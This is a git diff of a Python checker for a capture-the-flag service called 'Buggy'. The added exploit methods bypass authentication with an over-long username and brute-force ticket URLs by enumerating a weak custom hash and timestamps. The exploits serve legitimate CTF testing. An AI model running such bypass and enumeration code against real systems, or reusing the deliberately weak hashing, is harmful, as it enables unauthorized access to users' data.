@@ -1,5 +1,6 @@
 import html
 import random
+import requests
 import string
 
 from enochecker import *
@@ -10,7 +11,7 @@ import re
 from bs4 import BeautifulSoup as BS
 from datetime import datetime, timedelta
 from hashlib import sha256
-from time import sleep
+from time import sleep, time
 
 
 def random_string(amount):
@@ -19,15 +20,185 @@ def random_string(amount):
 
 class BuggyChecker(BaseChecker):
     port = 7890
-    flag_count = 1
+    flag_count = 2
     noise_count = 1
     havoc_count = 1
+    service_name = "Buggy"
 
     def putflag(self) -> None:
-        self.logger.debug("Starting putflag")
+        self.put_status()
+        return
+        if (self.flag_idx % 2) == 0:
+            self.put_status()
+        else:
+            self.put_ticket()
+
+    def put_status(self) -> None:
+        self.logger.debug("Starting putflag - status")
+        username, password, cookies = self.register()
+
+        # View Profile
+        response = self.http_get(route=f"/profile", cookies=cookies)
+        assert_equals(200, response.status_code, "Profile failed")
+        assert_in("buggy-team", response.text, "Profile failed")
+        assert_in("enjoy your stay!", response.text, "Profile failed")
+        assert_in("questions or feedback?", response.text, "Profile failed")
+        assert_in("Tickets: (0)", response.text, "Profile failed")
+        assert_in("orders: (0)", response.text, "Profile failed")
+
+        response = self.http_post(route=f"/profile", cookies=cookies, data={"status": self.flag})
+        assert_equals(302, response.status_code, "Status failed")
+        response = self.http_get(route=f"/profile", cookies=cookies)
+        assert_equals(200, response.status_code, "Status failed")
+        assert_in(self.flag, response.text, "Status failed")
+
+        self.logger.debug(f"saving creds")
+        self.team_db[sha256ify(self.flag)] = (username, password)
+
+        self.logger.debug("Done putflag - status")
+
+    def put_ticket(self) -> None:
+        self.logger.debug("Starting putflag - ticket")
+        username, password, cookies = self.register()
+        # Place order
+        buggy = random.choice(["super", "mega"])
+        color = random.choice(["terminal-turquoise", "cyber-cyan", "buggy-blue"])
+        quantity = random.randint(1, 99)
+        response = self.http_post(route=f"/{buggy}-buggy", cookies=cookies, data={"color":color, "quantity":quantity})
+        assert_equals(302, response.status_code, "Order failed")
+        assert_equals(response.next.url, response.url, "Order failed")
+        self.logger.debug("order placed")
+        # Write ticket
+        subject = random_string(20)
+        response = self.http_post(route="/tickets", cookies=cookies, data={"subject":subject, "message":self.flag})
+        self.logger.debug("ticket written")
+        assert_equals(302, response.status_code, "Ticket failed")
+        assert_equals(64, len(response.next.url.split("/")[-1]), "Ticket failed")
+        try:
+            hash = response.headers["location"].split("/")[-1].strip()
+        except Exception:
+            raise BrokenServiceException("Ticket failed")
+        assert_equals(64, len(hash), "Ticket failed")
+
+        # View order and ticket
+        response = self.http_get(route=f"/profile", cookies=cookies)
+        assert_equals(200, response.status_code, "Profile failed")
+        assert_in("buggy-team", response.text, "Profile failed")
+        assert_in("enjoy your stay!", response.text, "Profile failed")
+        assert_in("questions or feedback?", response.text, "Profile failed")
+        assert_in("Tickets: (1)", response.text, "Profile failed")
+        assert_in("orders: (1)", response.text, "Profile failed")
+
+        self.logger.debug(f"saving hash and order : {hash}")
+        self.team_db[sha256ify(self.flag)] = (hash, username, password)
+
+        self.logger.debug("Done putflag - ticket")
+
+    def register(self) -> (str, str, requests.cookies.RequestsCookieJar):
         username = random_string(20)
         password = random_string(20)
 
+        # Register
+        response = self.http_post(route="/register", data={"username":username, "pw":password},
+                allow_redirects=False)
+        cookies = response.cookies
+        if not cookies["buggy-cookie"]:
+            self.logger.debug(f"Failed register for user {username}")
+            raise BrokenServiceException("Cookies missing")
+        assert_equals(302, response.status_code, "Registration failed")
+        assert_equals(response.next.url, response.url.replace("register", ""), "Registration failed")
+
+        # Logout
+        response = self.http_get(route="/logout", cookies=cookies)
+        if response.cookies:
+            self.logger.debug(f"Failed logout for user {username}")
+            raise BrokenServiceException("Logout failed")
+        assert_equals(302, response.status_code, "Logout failed")
+        assert_equals(response.next.url, response.url.replace("logout", ""), "Logout failed")
+
+        # Login
+        response = self.http_post(route="/login", data={"username": username, "pw": password})
+        if not response.cookies["buggy-cookie"]:
+            self.logger.debug(f"Failed login for user {username}")
+            raise BrokenServiceException("Cookies missing")
+        assert_equals(302, response.status_code, "Login failed")
+        assert_equals(response.next.url, response.url.replace("login", ""), "Login failed")
+        self.logger.debug("registered and logged in")
+        return username, password, response.cookies
+
+    def getflag(self) -> None:
+        self.get_status()
+        return
+        if (self.flag_idx % 2) == 0:
+            self.get_status()
+        else:
+            self.get_ticket()
+
+    def get_status(self) -> None:
+        self.logger.debug("Starting getflag - status")
+        try:
+            (username, password) = self.team_db[sha256ify(self.flag)]
+        except KeyError as e:
+            self.logger.warning(f"flag info missing, {e}")
+            return Result.MUMBLE
+        response = self.http_post(route="/login", data={"username": username, "pw": password})
+        cookies = response.cookies
+        if not cookies["buggy-cookie"]:
+            self.logger.debug(f"Failed login for user {username}")
+            raise BrokenServiceException("Cookies missing")
+        assert_equals(302, response.status_code, "Login failed")
+        assert_equals(response.next.url, response.url.replace("login", ""), "Login failed")
+
+        response = self.http_get(route=f"/profile", cookies=cookies)
+        assert_equals(200, response.status_code, "Profile failed")
+        assert_in(self.flag, response.text, "Flag missing")
+        assert_in("buggy-team", response.text, "Profile failed")
+        assert_in("enjoy your stay!", response.text, "Profile failed")
+        assert_in("questions or feedback?", response.text, "Profile failed")
+        assert_in("Tickets: (0)", response.text, "Profile failed")
+        assert_in("orders: (0)", response.text, "Profile failed")
+        self.logger.debug("Done getflag - status")
+
+    def get_ticket(self) -> None:
+        # TODO: Check order?
+        self.logger.debug("Starting getflag - ticket")
+        try:
+            (hash, username, password) = self.team_db[sha256ify(self.flag)]
+        except KeyError as e:
+            self.logger.warning(f"flag info missing, {e}")
+            return Result.MUMBLE
+        response = self.http_post(route="/login", data={"username": username, "pw": password})
+        cookies = response.cookies
+        if not cookies["buggy-cookie"]:
+            self.logger.debug(f"Failed login for user {username}")
+            raise BrokenServiceException("Cookies missing")
+        assert_equals(302, response.status_code, "Login failed")
+        assert_equals(response.next.url, response.url.replace("login", ""), "Login failed")
+        response = self.http_get(route=f"/tickets/{hash}", cookies=cookies)
+        assert_equals(200, response.status_code, "Login failed")
+        assert_in(self.flag, response.text, "Flag missing")
+
+        response = self.http_get(route=f"/profile", cookies=cookies)
+        assert_equals(200, response.status_code, "Profile failed")
+        assert_in("buggy-team", response.text, "Profile failed")
+        assert_in("enjoy your stay!", response.text, "Profile failed")
+        assert_in("questions or feedback?", response.text, "Profile failed")
+        assert_in("Tickets: (1)", response.text, "Profile failed")
+        assert_in("orders: (1)", response.text, "Profile failed")
+        self.logger.debug("Done getflag - ticket")
+
+    def putnoise(self) -> None:
+        self.logger.info("Starting putnoise")
+        pass
+
+    def getnoise(self) -> None:
+        self.logger.info("Starting getnoise")
+        pass
+
+    def havoc(self) -> None:
+        self.logger.info("Starting havoc")
+        # TODO
+        return
         # Register account
         response = self.http_post(route="/register", data={"username":username, "pw":password},
                 allow_redirects=False)
@@ -47,8 +218,8 @@ class BuggyChecker(BaseChecker):
         assert_equals(302, response.status_code, "commenting failed")
 
         cookies = response.cookies
-        subject = random_string(20)
         # Write ticket
+        subject = random_string(20)
         response = self.http_post(route="/tickets", data={"subject":subject, "message":self.flag},
                 cookies=cookies, allow_redirects=False)
         self.logger.debug("ticket written")
@@ -65,103 +236,84 @@ class BuggyChecker(BaseChecker):
         self.logger.debug(f"saving hash : {hash}")
         self.team_db[sha256ify(self.flag)] = (hash, username, password)
 
-    def getflag(self) -> None:
-        self.logger.debug("Starting getflag")
-        try:
-            (hash, user, password) = self.team_db[sha256ify(self.flag)]
-        except KeyError as e:
-            self.logger.warning(f"flag info missing, {e}")
-            return Result.MUMBLE
-
-        # Login
-        response = self.http_post(route="/login", data={"username": user,
-                            "pw": password}, allow_redirects=False)
-
-        if 302 != response.status_code:
-            self.logger.error(f"expected 302, got {response.status_code}")
-            self.logger.error(f"login failed with user : {user} pw : {password} response : {response.text}")
-            raise BrokenServiceException("getflag login failed")
-        self.logger.debug("logged in")
-
-        # TODO: View comment?
-
-        # View ticket
-        response = self.http_get(route=f"/tickets/{hash}")
-        self.logger.debug("ticket loaded")
-
-        if response.status_code != 200:
-            self.logger.error(f"expected status 200, got {response.status_code}")
-            raise BrokenServiceException(f"view ticket failed")
-        if self.flag not in html.unescape(response.text):
-            self.logger.error(f"flag {self.flag} not found in {response.text}")
-            raise BrokenServiceException(f"flag not found")
-
-
-    def putnoise(self) -> None:
-        self.logger.info("Starting putnoise")
-        pass
-
-    def getnoise(self) -> None:
-        self.logger.info("Starting getnoise")
-        pass
-
-    def havoc(self) -> None:
-        self.logger.info("Starting havoc")
-        try:
-            pass
-        except Exception:
-            raise BrokenServiceException("checker failed")
-
     def exploit(self) -> None:
-        password = random_string(20)
-        u = random_string(65)
-        password = "test123"
+        if random.choice([0,1]) == 0:
+            self.exploit_status()
+        else:
+            self.exploit_ticket()
 
-        response = self.http_post(route="/register", data={"username":u, "pw":password},
-                allow_redirects=True)
-        r = self.http_get(route=f"/user/itdoesntmatter", cookies=response.cookies)
+    def exploit_status(self) -> None:
+        """
+        Status Exploit
+        --------------------------------------------------
+        Trivial exploit if you know what to do, also relatively easy to fix.
+        --------------------------------------------------
+        Steps:
+        - Register as user with len(username) > 64
+        - You will get a valid session although no user is inserted in the database
+        - Navigate to /user/<anystring>
+        - Because of a buggy if comparison in the keepUser function, you will get all user profiles
+        - Get flags from status field
+        """
+        password = random_string(20)
+        username = random_string(65)
+        response = self.http_post(route="/register", data={"username":username, "pw":password})
+        r = self.http_get(route=f"/user/itdoesntevenmatter", cookies=response.cookies)
         print(r.text)  # Flags in here
 
-        return
-        # Old stuff down here
-
-        # response = self.http_post(route="/register", data={"username":u, "pw":password},
-        #         allow_redirects=False)
-        # r = self.http_get(route=f"/logout")
-        comment = "Awesome!"
-        # Post Comment
-        buggy = random.choice(["super", "mega"])
-        response = self.http_post(route=f"/{buggy}-buggy", data={"comment":comment},
-                cookies=r.cookies, allow_redirects=False)
-
-
-        # FLAG_RE = r"🏳️‍🌈\\X{4}"
-        u = []
-        for b in ["mega", "super"]:
-            r = self.http_get(route=f"/{b}-buggy")
-            s = BS(r.text, "html.parser")
-            c = s.find_all(class_="comment")
-            for x in c:
-                t = x.find(class_="cmnt-content")
-                a = x.find(class_="commenter")
-                u.append((a.h3.string, t.p.string))
-        username = random_string(20)
+    def exploit_ticket(self) -> None:
+        """
+        Ticket Exploit
+        --------------------------------------------------
+        Enumeration-heavy exploit which should not be too hard to find and fix.
+        --------------------------------------------------
+        Steps:
+        - Register a user
+        - Enumerate possible order hashes using color+itemId+quantity
+        - Get usernames from orders
+          ( - It's probably a good idea to get and use the order id too)
+        - Enumerate possible tickets using username+timestamp
+        - Get flag from ticket message
+        """
         password = random_string(20)
-        response = self.http_post(route="/register", data={"username":username, "pw":password},
-                allow_redirects=False)
+        username = random_string(65)
+        response = self.http_post(route="/register", data={"username":username, "pw":password})
         cookies = response.cookies
-        for x in u:
-            t = str(int((datetime.strptime(x[1], "%Y-%m-%d %H:%M:%S") + timedelta(hours=2)).timestamp()))
-            for i in range(int(t)-10, int(t)+10):
-                h = sha256()
-                h.update((x[0]+str(i)).encode())
-                h = h.hexdigest()
+        c = ["terminal-turquoise", "cyber-cyan", "buggy-blue"]
+        i = ["1", "2"]
+        q = [str(x) for x in range(10)]  # For all orders this needs to be 99
+        users = set()
+        for x in c:
+            for y in i:
+                for z in q:
+                    h = hash_func(x, y, z)
+                    r = self.http_get(route=f"/orders/{h}", cookies=cookies,
+                        allow_redirects=False)
+                    if r.status_code == 200:
+                        user = ""
+                        for line in r.text.split("\n"):
+                            if "User:" in line:
+                                user = line.split("<h3>User:")[1].strip().split("</h3")[0]
+                                users.add(user)
+        t = str(int(time()))[:-1]
+        for user in users:
+            for i in range(int(t)-100, int(t)):
+                h = hash_func(user, str(i))
                 r = self.http_get(route=f"/tickets/{h}", cookies=cookies)
                 if "Ticket" in r.text or "buggy-team" in r.text:
-                    print(r.text)  # Use flagbot to strip stdout
-                    fl = re.findall(FLAG_RE, r.text)
-                    for f in fl:
-                        print(f)
+                    print(r.text)  # Flag in here
+
+
+def hash_func(*args):
+    b = bytearray([0 for x in range(64)])
+    for s in args:
+        for i in range(64):
+            b[i] = (ord(s[((i+1)%len(s))]) ^ ord(s[(i%len(s))])) ^ b[i]
+    h = sha256()
+    h.update(b)
+    h = h.hexdigest()
+    return h
+
 
 app = BuggyChecker.service
 
